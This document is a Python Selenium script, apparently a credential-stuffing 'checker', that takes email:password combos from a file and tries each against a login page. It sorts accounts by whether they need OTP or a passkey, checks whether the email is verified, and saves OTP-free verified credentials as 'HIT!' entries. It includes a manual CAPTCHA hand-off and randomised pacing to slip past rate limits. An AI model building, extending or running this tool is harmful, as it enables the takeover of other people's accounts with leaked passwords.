#!/usr/bin/env python3
"""
local project login checker – OTP‑free + email‑verified detection

Author: Your Name (cyber‑security senior dev)
Date: 2024‑08‑XX
"""

import os
import sys
import time
import random
import logging
import argparse
from pathlib import Path
from typing import List, Tuple

# ----- 1️⃣ Imports from external packages  ------------------------------------
import selenium
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
# import undetected_chromedriver as uc
# from webdriver_manager.chrome import ChromeDriverManager
from dotenv import load_dotenv

# ----- 2️⃣ Load environment variables -----------------------------------------
load_dotenv()  # reads .env file

# ----- 3️⃣ Global configuration -----------------------------------------------
CHROME_USER_DATA = Path(os.getenv("CHROME_USER_DATA", "~/automation_chrome_user_data")).expanduser()
PROFILES = [p.strip() for p in os.getenv("PROFILES", "Profile-1,Profile-2,Profile-3").split(",")]
HEADLESS = os.getenv("HEADLESS", "false").lower() == "true"

INPUT_FILE = Path(os.getenv("INPUT_FILE", "emails_and_passwords.txt")).expanduser()
OUTPUT_FILE = Path(os.getenv("OUTPUT_FILE", "results_all_debug.txt")).expanduser()
TARGET_FILE = Path(os.getenv("TARGET_FILE", "otp_free_verified_debug.txt")).expanduser()

# ----- 4️⃣ Logging configuration -----------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    handlers=[
        logging.FileHandler("local_project_checker.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

# ----- 5️⃣ Helper: create Chrome options --------------------------------------
def chrome_options_for_profile(profile_name: str) -> Options:
    options = Options()

    options.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

    options.add_argument(
        f"--user-data-dir={CHROME_USER_DATA}"
    )
    options.add_argument(
        f"--profile-directory={profile_name}"
    )
    options.add_argument("--window-size=1920,1080")

    # Troubleshooting: explicitly do NOT use headless mode.
    return options

# ----- 6️⃣ Browser wrapper -----------------------------------------------
class BrowserWrapper:
    """
    Wrapper around Selenium Chrome.
    """

    def __init__(self, profile: str):
        opts = chrome_options_for_profile(profile)

        profile_path = CHROME_USER_DATA / profile
        profile_path.mkdir(parents=True, exist_ok=True)

        logging.info("Chrome user-data-dir: %s", CHROME_USER_DATA)
        logging.info("Chrome profile: %s", profile)
        logging.info("Chrome profile path: %s", profile_path)
        logging.info("Starting Chrome...")

        try:
            self.driver = webdriver.Chrome(options=opts)

            logging.info(
                "Browser started for profile '%s'. Browser version: %s",
                profile,
                self.driver.capabilities.get("browserVersion")
            )

        except Exception:
            logging.exception(
                "Failed to start browser for profile '%s'",
                profile
            )
            raise

    def quit(self):
        if getattr(self, "driver", None):
            self.driver.quit()
            logging.info("Browser session closed.")

# ----- 7️⃣ Main checker class -----------------------------------------------
class LocalProjectCheckerBypass:
    def passkey_present(self) -> bool:
        """
        Detect common passkey/WebAuthn UI indicators.
        """
        selectors = [
            "[id*='passkey' i]",
            "[class*='passkey' i]",
            "[data-testid*='passkey' i]",
            "button",
            "[role='button']",
        ]

        keywords = [
            "passkey",
            "use a passkey",
            "sign in with a passkey",
            "security key",
            "webauthn",
        ]

        for selector in selectors:
            try:
                elements = self.driver.find_elements(
                    By.CSS_SELECTOR,
                    selector,
                )

                for element in elements:
                    if not element.is_displayed():
                        continue

                    text = element.text.strip().lower()

                    if any(keyword in text for keyword in keywords):
                        return True

            except Exception:
                continue

        try:
            body_text = self.driver.find_element(
                By.TAG_NAME,
                "body",
            ).text.lower()

            return any(
                keyword in body_text
                for keyword in keywords
            )

        except Exception:
            return False
    """
    Automates the Local project login flow and interprets the result.
    """
    def captcha_present(self) -> bool:
        """
        Return True when a visible CAPTCHA/challenge is present.
        """
        selectors = [
            "iframe[src*='captcha']",
            "iframe[title*='captcha' i]",
            "[id*='captcha' i]",
            "[class*='captcha' i]",
            "[data-testid*='captcha' i]",
        ]

        for selector in selectors:
            try:
                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)

                for element in elements:
                    if element.is_displayed():
                        return True

            except Exception:
                continue

        return False


    def wait_for_manual_captcha(self, timeout: int = 3000) -> bool:
        """
        Pause automation while the user solves a CAPTCHA in Chrome.

        Returns:
            True  -> CAPTCHA disappeared
            False -> timeout
        """
        if not self.captcha_present():
            return True

        logging.warning(
            "CAPTCHA detected. Please solve it manually in the Chrome window."
        )

        logging.info(
            "Waiting up to %d seconds for CAPTCHA completion...",
            timeout
        )

        try:
            WebDriverWait(
                self.driver,
                timeout,
                poll_frequency=1
            ).until(
                lambda driver: not self.captcha_present()
            )

            logging.info("CAPTCHA appears to be completed.")
            return True

        except Exception:
            logging.error(
                "CAPTCHA was not completed within %d seconds.",
                timeout
            )
            return False

    def __init__(self, profile: str):
        self.browser = BrowserWrapper(profile)
        self.driver = self.browser.driver
        self.wait = WebDriverWait(self.driver, 15)

    # -------------------------------------------------------------------------
    def _navigate(self, url: str):
        try:
            self.driver.get(url)
            self.wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            logging.debug(f"🖱️ Navigated to {url}")
        except Exception as e:
            logging.error(f"❌ Navigation error to {url}: {e}")
            raise

    # -------------------------------------------------------------------------
    def check_combo(self, email: str, password: str) -> str:
        """
        Return one of:
          OTP_FREE_CHECK_VERIFIED, OTP_FREE_VERIFIED, OTP_FREE_NOT_VERIFIED,
          INVALID_PASS, OTP_REQUIRED, ERR_PASS_FIELD, ERR_LOGIN_BTN,
          ERR_BROWSER, UNKNOWN_STATE
        """
        try:
            self._navigate("https://dashboard.LocalCyber.com/login")

            # 1️⃣ Email field
            email_el = self.wait.until(
                EC.visibility_of_element_located((By.ID, "email"))
            )
            email_el.clear()
            email_el.send_keys(email)
            time.sleep(0.5)

            # 2️⃣ Next / Password field
            next_btn = None
            try:
                next_btn = self.driver.find_element(By.CSS_SELECTOR,
                                                    "button[type='button'], span[data-testid*='next']")
                if next_btn.is_displayed():
                    next_btn.click()
                    time.sleep(1)
            except Exception:
                pass  # assume password field is already visible

            # 3️⃣ Password field
            pwd_el = self.wait.until(
                EC.visibility_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
            )
            pwd_el.clear()
            pwd_el.send_keys(password)
            time.sleep(0.5)

            # 4️⃣ Login button
            login_btn = self.wait.until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
            )
            login_btn.click()

            # Give the application a moment to render the next state.
            time.sleep(2)

            # CAPTCHA is a security state, not an invalid-login result.
            if self.captcha_present():
                if not self.wait_for_manual_captcha(timeout=3000):
                    return "CAPTCHA_TIMEOUT"

                # Give the application time to process the completed challenge.
                time.sleep(2)

            elif self.passkey_present():
                logging.info(
                    "Passkey/WebAuthn authentication requested."
                )
                return "PASSKEY_REQUIRED"

            # 5️⃣ Wait for potential redirect / error / captcha
            time.sleep(3)  # give the page a chance to change

            current_url = self.driver.current_url
            logging.debug(f"Current URL after login: {current_url}")

            # 6️⃣ Determine state
            # 6a) If we are no longer on the login page → OTP‑free
            if "dashboard.LocalCyber.com/login" not in current_url:
                return "OTP_FREE_CHECK_VERIFIED"

            # 6b) Look for error messages
            try:
                error_el = self.driver.find_element(By.CSS_SELECTOR,
                                                    ".error-message, .alert")
                if error_el.is_displayed():
                    err = error_el.text.lower()
                    if "invalid" in err or "password" in err:
                        return "INVALID_PASS"
                    if "otp" in err or "code" in err:
                        return "OTP_REQUIRED"
            except Exception:
                pass

            # 6c) Look for an OTP field
            try:
                otp_el = self.driver.find_element(By.ID, "otp_code")
                if otp_el.is_displayed():
                    return "OTP_REQUIRED"
            except Exception:
                pass

            return "UNKNOWN_STATE"

        except Exception as e:
            logging.error(f"❌ Critical error during check_combo: {e}")
            return "ERR_BROWSER"

    # -------------------------------------------------------------------------
    def verify_email_status(self) -> bool:
        """
        After an OTP‑free login, navigate to the settings page and look for
        a 'verified' badge or text.
        """
        try:
            self._navigate("https://accounts.LocalCyber.com/account/settings")
            body_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            if "verified" in body_text and "email" in body_text:
                return True
            # Some pages use a badge element
            try:
                badge = self.driver.find_element(By.CSS_SELECTOR, ".verified-badge")
                if badge.is_displayed():
                    return True
            except Exception:
                pass
            return False
        except Exception as e:
            logging.error(f"❌ Error verifying email status: {e}")
            return False

    # -------------------------------------------------------------------------
    def close(self):
        self.browser.quit()

# ----- 8️⃣ Utility: read combos -----------------------------------------------
def load_combos(file_path: Path) -> List[Tuple[str, str]]:
    combos = []
    try:
        with file_path.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or ":" not in line:
                    continue
                email, pwd = line.split(":", 1)
                combos.append((email.strip(), pwd.strip()))
    except FileNotFoundError:
        logging.error(f"❌ Input file not found: {file_path}")
        sys.exit(1)
    return combos

def append_line(path: Path, line: str) -> None: 
    """Append one UTF-8 line to a file, creating it if necessary.""" 
    with path.open("a", encoding="utf-8") as f: 
        f.write(line + "\n")
# ----- 9️⃣ Main routine -------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Local project OTP‑free & email‑verified checker."
    )
    parser.add_argument(
        "--profile",
        help="Chrome profile to use (default: Profile-1)",
        default="Profile-1",
    )
    args = parser.parse_args()

    if args.profile not in PROFILES:
        logging.warning(f"Profile '{args.profile}' not in configured list. Using '{PROFILES[0]}' instead.")
        profile_name = PROFILES[0]
    else:
        profile_name = args.profile

    checker = LocalProjectCheckerBypass(profile_name)

    combos = load_combos(INPUT_FILE)
    logging.info(f"Found {len(combos)} combos to test.")

    # Ensure output files are fresh
    OUTPUT_FILE.write_text("", encoding="utf-8")
    TARGET_FILE.write_text("", encoding="utf-8")

    verified_count = 0

    for email, pwd in combos:
        logging.info(f"--- Checking {email} ---")
        status = checker.check_combo(email, pwd)

        if status == "OTP_FREE_CHECK_VERIFIED":
            verified = checker.verify_email_status()
            status = "OTP_FREE_VERIFIED" if verified else "OTP_FREE_NOT_VERIFIED"

        # Log the result
        log_line = f"{email}:{pwd} | Status: {status}"
        append_line(OUTPUT_FILE, log_line)

        if status == "OTP_FREE_VERIFIED":
            verified_count += 1
            append_line(TARGET_FILE, f"{email}:{pwd}")
            logging.info(f"✅ HIT! {email} is OTP‑free & verified.")

        time.sleep(random.uniform(3, 6))  # gentle pacing

    checker.close()
    logging.info(f"✔️ Done. Checked {len(combos)} combos.")
    logging.info(f"✔️ Found {verified_count} OTP‑free + verified accounts in {TARGET_FILE}")

# -------------------------------------------------------------------------------
if __name__ == "__main__":
    main()